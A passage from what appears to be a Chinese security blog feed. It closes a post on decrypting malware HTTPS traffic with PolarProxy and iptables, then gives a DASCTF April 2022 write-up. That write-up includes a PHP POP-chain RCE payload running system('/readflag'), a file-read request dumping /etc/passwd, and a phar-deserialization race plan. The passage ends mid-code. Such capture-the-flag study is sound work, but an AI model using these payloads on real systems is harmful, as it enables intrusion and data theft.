class="built_in">log</span>/PolarProxy/</span><br><span class="line">sudo chmod 0775 /var/<span class="built_in">log</span>/PolarProxy/</span><br><span class="line">sudo su - proxyuser</span><br><span class="line">mkdir ~/PolarProxy</span><br><span class="line"><span class="built_in">cd</span> ~/PolarProxy/</span><br><span class="line">curl https://www.netresec.com/?download=PolarProxy | tar -xzf -</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">sudo cp /home/proxyuser/PolarProxy/PolarProxy.service /etc/systemd/system/PolarProxy.service</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> PolarProxy.service</span><br><span class="line">sudo systemctl start PolarProxy.service</span><br></pre></td></tr></table></figure><p>配置系统证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /usr/share/ca-certificates/extra</span><br><span class="line">sudo openssl x509 -inform DER -<span class="keyword">in</span> /var/<span class="built_in">log</span>/PolarProxy/polarproxy.cer -out /usr/share/ca-certificates/extra/PolarProxy-root-CA.crt</span><br><span class="line">sudo dpkg-reconfigure ca-certificates</span><br></pre></td></tr></table></figure><p>启用<code>extra /PolarProxy-root-CA.crt</code>即可</p><p>配置iptables</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A OUTPUT -m owner --uid 0 -p tcp --dport 443 -j REDIRECT --to 10443</span><br><span class="line">iptables -t nat -A OUTPUT -m owner --uid 1000 -p tcp --dport 443 -j REDIRECT --to 10443</span><br></pre></td></tr></table></figure><p>运行恶意程序后在目录<code>/var/log/PolarProxy/</code>中可以看到程序捕获并解密的HTTPS流量</p><p>使用wireshark打开即可</p><p>普通用户运行恶意程序没啥反应，用root运行才抓到包</p><p>顺带一提，这个程序默认每天解密10GB的HTTPS的流量或10000次SESSION，但是够用了</p><hr /><h1 id="0x04-ecapture"><a class="markdownIt-Anchor" href="#0x04-ecapture"></a> 0x04 ecapture</h1><p><a href="https://github.com/ehids/ecapture">https://github.com/ehids/ecapture</a></p><p>看ebpf rootkit的时候看到了一个基于ebpf的monitor</p><p>能检测bash和解密https</p><p>解密的大概思路是hook一些ssl库，对于tls层可以直接获取http请求与响应</p><p>也就意味着这玩意甚至能免除用于MITM的CA</p><p>但是缺点也很明显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldd .&#x2F;apache2</span><br><span class="line"> not a dynamic executable</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;距离省考宣布寄了已经过去了两个月了&lt;br /&gt;
于是打了两个月的游戏，属实是打吐了&lt;br /&gt;
出来去原来的单位实习&lt;br /&gt;
上来就是分析病毒&lt;br /&gt;
在摸索的过程中产生了这篇文章&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Reverse" scheme="https://yoloyolo.top/tags/Reverse/"/>
    
    <category term="HTTPS" scheme="https://yoloyolo.top/tags/HTTPS/"/>
    
    <category term="Traffic_Analysis" scheme="https://yoloyolo.top/tags/Traffic-Analysis/"/>
    
    <category term="Malware" scheme="https://yoloyolo.top/tags/Malware/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF_APR_2022</title>
    <link href="https://yoloyolo.top/2022/04/24/DASCTF-APR-2022/"/>
    <id>https://yoloyolo.top/2022/04/24/DASCTF-APR-2022/</id>
    <published>2022-04-24T05:52:50.000Z</published>
    <updated>2022-04-25T08:01:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>本来恰完KFC晚餐准备回寝室打游戏来着，路上被队友喊去做WEB了<br />说是今天BUUOJ上的比赛，但是已经打完了，做两题玩玩<br />但是我上一次碰CTF还是去年的省赛…</p><a id="more"></a><h1 id="warmup-php"><a class="markdownIt-Anchor" href="#warmup-php"></a> warmup-php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./class/&quot;</span>.<span class="variable">$class</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line"><span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line"><span class="variable">$object</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Action(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>参数<code>action</code>用于输入类名<br />参数<code>properties</code>用于输入对象的属性<br />完事后会执行<code>$object-&gt;run()</code><br />函数<code>run()</code>在<code>ListView.php</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ListView</span> <span class="keyword">extends</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$tagName</span>=<span class="string">&#x27;div&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$template</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;&quot;</span>.<span class="keyword">$this</span>-&gt;tagName.<span class="string">&quot;&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;renderContent();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;&quot;</span>.<span class="keyword">$this</span>-&gt;tagName.<span class="string">&quot;&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderContent</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">echo</span> preg_replace_callback(<span class="string">&quot;/&#123;(\w+)&#125;/&quot;</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>,<span class="string">&#x27;renderSection&#x27;</span>),<span class="keyword">$this</span>-&gt;template);</span><br><span class="line">ob_end_flush();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">renderSection</span>(<span class="params"><span class="variable">$matches</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$method</span>=<span class="string">&#x27;render&#x27;</span>.<span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>,<span class="variable">$method</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;<span class="variable">$method</span>();</span><br><span class="line"><span class="variable">$html</span>=ob_get_contents();</span><br><span class="line">ob_clean();</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$matches</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>run()</code> -&gt; <code>renderContent()</code> -&gt; <code>renderSection()</code><br />其中函数<code>renderSection()</code>为函数<code>renderContent()</code>中正则匹配替换的回调函数<br />用于匹配<code>&#123;\w+&#125;</code>的字符串，并将<code>\w+</code>拼接到&quot;render&quot;之后，再检验类中是否有这个函数，如果有则执行，没有则输出<code>&#123;\w+&#125;</code></p><p>再看<code>TestView.php</code>的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableRow</span>(<span class="params"><span class="variable">$row</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$htmlOptions</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression!==<span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data[<span class="variable">$row</span>];</span><br><span class="line"><span class="variable">$options</span>=<span class="keyword">$this</span>-&gt;evaluateExpression(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression,<span class="keyword">array</span>(<span class="string">&#x27;row&#x27;</span>=&gt;<span class="variable">$row</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$options</span>))</span><br><span class="line"><span class="variable">$htmlOptions</span> = <span class="variable">$options</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rowCssClassExpression!==<span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;dataProvider-&gt;data[<span class="variable">$row</span>];</span><br><span class="line"><span class="variable">$class</span>=<span class="keyword">$this</span>-&gt;evaluateExpression(<span class="keyword">$this</span>-&gt;rowCssClassExpression,<span class="keyword">array</span>(<span class="string">&#x27;row&#x27;</span>=&gt;<span class="variable">$row</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(is_array(<span class="keyword">$this</span>-&gt;rowCssClass) &amp;&amp; (<span class="variable">$n</span>=count(<span class="keyword">$this</span>-&gt;rowCssClass))&gt;<span class="number">0</span>)</span><br><span class="line"><span class="variable">$class</span>=<span class="keyword">$this</span>-&gt;rowCssClass[<span class="variable">$row</span>%<span class="variable">$n</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$class</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$htmlOptions</span>[<span class="string">&#x27;class&#x27;</span>]))</span><br><span class="line"><span class="variable">$htmlOptions</span>[<span class="string">&#x27;class&#x27;</span>].=<span class="string">&#x27; &#x27;</span>.<span class="variable">$class</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="variable">$htmlOptions</span>[<span class="string">&#x27;class&#x27;</span>]=<span class="variable">$class</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableBody</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data;</span><br><span class="line"><span class="variable">$n</span>=count(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr /&gt;&quot;</span>.<span class="variable">$n</span>.<span class="string">&quot;&lt;hr /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;tbody&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$n</span>&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$row</span>=<span class="number">0</span>;<span class="variable">$row</span>&lt;<span class="variable">$n</span>;++<span class="variable">$row</span>)</span><br><span class="line"><span class="keyword">$this</span>-&gt;renderTableRow(<span class="variable">$row</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;tr&gt;&lt;td colspan=&quot;&#x27;</span>.count(<span class="keyword">$this</span>-&gt;columns).<span class="string">&#x27;&quot; class=&quot;empty&quot;&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/tbody&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>renderTableBody()</code> -&gt; <code>renderTableRow()</code> -&gt; <code>evaluateExpression()</code><br />函数<code>evaluateExpression()</code>在Base.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evaluateExpression</span>(<span class="params"><span class="variable">$_expression_</span>,<span class="variable">$_data_</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_expression_</span>.<span class="string">&quot; &quot;</span>.var_dump(<span class="variable">$_data_</span>).<span class="string">&quot;&lt;hr /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(is_string(<span class="variable">$_expression_</span>))</span><br><span class="line">&#123;</span><br><span class="line">extract(<span class="variable">$_data_</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">eval</span>(<span class="string">&#x27;return &#x27;</span>.<span class="variable">$_expression_</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$_data_</span>[]=<span class="keyword">$this</span>;</span><br><span class="line"><span class="keyword">return</span> call_user_func_array(<span class="variable">$_expression_</span>, <span class="variable">$_data_</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到最终目的是调用函数中<code>evaluateExpression()</code>的函数<code>eval()</code>以造成RCE<br />那么可以构造出一个POP链</p><p><code>$template = &quot;&#123;TableBody&#125;&quot;</code><br />经过POP链<code>run()</code> -&gt; <code>renderContent()</code> -&gt; <code>renderSection()</code>后<br />到达函数<code>renderTableBody()</code><br />这里有<code>count($data)</code>，然后进行迭代运行函数<code>renderTableRow()</code><br />所以需要<br /><code>$data = 1</code><br />到达函数<code>renderTableRow()</code>后，有两条路可以进入函数<code>evaluateExpression()</code><br />这里我走的是第一条路，只需要把<code>rowHtmlOptionsExpression</code>设置为不为NULL即可<br />进入函数<code>evaluateExpression()</code>后就会直接<code>eval($rowHtmlOptionsExpression)</code><br />所以放命令即可<br /><code>$rowHtmlOptionsExpression = &quot;system(\&quot;/readflag\&quot;)&quot;</code></p><p>回到开头的两个参数，代入上述参数即可获得flag</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://aa876c17-0ddb-43f7-978e-1ca06b58fe7e.node4.buuoj.cn:81/?action=TestView --data <span class="string">&#x27;properties[template]=&#123;TableBody&#125;&amp;properties[data]=0&amp;properties[rowHtmlOptionsExpression]=system(&quot;/readflag&quot;)&#x27;</span> | grep flag</span><br><span class="line">flag&#123;e2fec3cf-a368-45da-9277-2f21aa384a78&#125;</span><br></pre></td></tr></table></figure><p>队友本来RCE成功了，hackerbar把phpinfo挡住了，以为没RCE出来…</p><hr /><h1 id="soeasy_php"><a class="markdownIt-Anchor" href="#soeasy_php"></a> soeasy_php</h1><p>给的附件是个dockerfile，没啥用感觉</p><p>进来就是个上传点，但是我上传了个php后给我的上传路径后缀是png我就觉得不对了<br />F12查看源码可以看到还有个编辑头像功能<br />尝试将头像换为其他文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">curl http://45632cf4-8a41-4ab2-bf06-65db1ccc6307.node4.buuoj.cn:81/edit.php --data <span class="string">&#x27;png=/etc/passwd&amp;flag=&#x27;</span></span><br><span class="line">成功更换头像</span><br><span class="line"></span><br><span class="line">curl http://45632cf4-8a41-4ab2-bf06-65db1ccc6307.node4.buuoj.cn:81/uploads/head.png</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/bin/<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>然后就读源码了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#edit.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;error_reporting&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        exec(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;copyflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filewrite</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">        file_put_contents(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/:|phar|\/\/|php/im&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="variable">$contents</span> = fread(<span class="variable">$f</span>, filesize(<span class="variable">$filename</span>));</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$contents</span>,<span class="string">&quot;flag&#123;&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            filewrite(<span class="variable">$filename</span>,<span class="string">&quot;Don&#x27;t give me flag!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> == <span class="string">&quot;Give me flag&quot;</span>) &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="string">&quot;Don&#x27;t give me flag&quot;</span>);</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="variable">$flag</span>);  <span class="comment">//不给我看我自己写个flag。</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$head</span> = <span class="string">&quot;uploads/head.png&quot;</span>;</span><br><span class="line">        unlink(<span class="variable">$head</span>);</span><br><span class="line">        <span class="keyword">if</span> (symlink(<span class="variable">$filename</span>, <span class="variable">$head</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;成功更换头像&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;非正常文件，已被删除&quot;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一眼反序列化，但是半天没看见函数<code>unserialize()</code><br />翻了翻笔记才想起来这玩意是phar反序列化<br />通过文件函数来触发反序列化<br />这里可以触发的有</p><ul><li><code>fopen()</code></li><li><code>file_put_contents()</code></li><li><code>unlink()</code></li></ul><p>首先参数<code>png</code>的正则绕不过去，后面两个函数<code>filewrite()</code>参数定死，函数<code>unlink($head)</code>参数定死<br />那就剩下最后一个函数<code>unlink($filename)</code>了<br />而执行函数<code>unlink($filename)</code>需要函数<code>symlink($filename, $head)</code><br />尝试给filename塞个数组进去，symlink确实寄了，但是unlink也寄了<br />想来想去还是只能竞争symlink了<br />只要我请求够快，就会有两个PHP线程在<code>unlink($head)</code>之后执行<code>symlink($filename, $head)</code><br />但是<code>symlink()</code>不能创建同名链接，所以慢的那个会False，然后运行<code>unlink($filename)</code>，即触发phar反序列化</p><p>即使触发了phar反序列化，flag内容被写入到了<code>/tmp/flag.txt</code><br />要读取flag必定要<code>symlink(&quot;/tmp/flag.txt&quot;, &quot;uploads/head.png&quot;)</code>，然后访问head.png<br />但在此之前，会执行<code>filewrite(&quot;/tmp/flag.txt&quot;, &quot;Don't give me flag&quot;);</code>或<code>filewrite(&quot;/tmp/flag.txt&quot;, $flag);</code><br />也就是说<code>/tmp/flag.txt</code>会被覆写，所以需要再进行一次竞争</p><p>但是从总体流程上来讲，这两次竞争完全可以放一起，以达到以下竞争效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">覆写错误flag -&gt;</span><br><span class="line">symlink链接phar文件 -&gt;</span><br><span class="line">symlink竞争触发unlink(phar) -&gt;</span><br><span class="line">覆写正确flag -&gt;</span><br><span class="line">symlink链接&#x2F;tmp&#x2F;flag.txt -&gt;</span><br><span class="line">读取正确flag</span><br></pre></td></tr></table></figure><p>这个思路看起来有点天方夜谭，但是还是能竞争出来的<br />（这题做出来的时候总感觉自己是非预期解法）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 